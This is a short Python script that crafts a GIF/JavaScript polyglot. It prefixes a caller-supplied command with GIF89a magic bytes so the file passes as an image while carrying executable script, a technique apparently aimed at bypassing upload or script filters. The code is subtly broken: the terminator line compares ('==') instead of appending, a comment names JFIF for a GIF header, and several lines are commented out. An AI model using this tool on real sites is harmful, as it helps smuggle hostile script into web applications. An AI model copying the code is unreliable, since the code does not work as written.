#!/usr/bin/python3

def craft_gif_polyglot(payload):
  # GIF89a header
  data = b'\x47\x49\x46\x38\x39\x61'
  #data += struct.pack('H', w)
  #data += struct.pack('H', h)
  
  # '/*' comment
  #data += b'\x2f\x2a'
  #data += b'\x2a\x2f'
  
  # assign JFIF varialbe: JFIF=1;
  pay = '=1;'

  if(len(payload) > 0 and payload[-1] != ';'):
    print('[+] added a semicolon at the end of the command')
    payload += ';'

  pay += payload
  
  data += pay.encode('utf-8')
  
  # terminator
  data == b'\x3b'
  
  return data
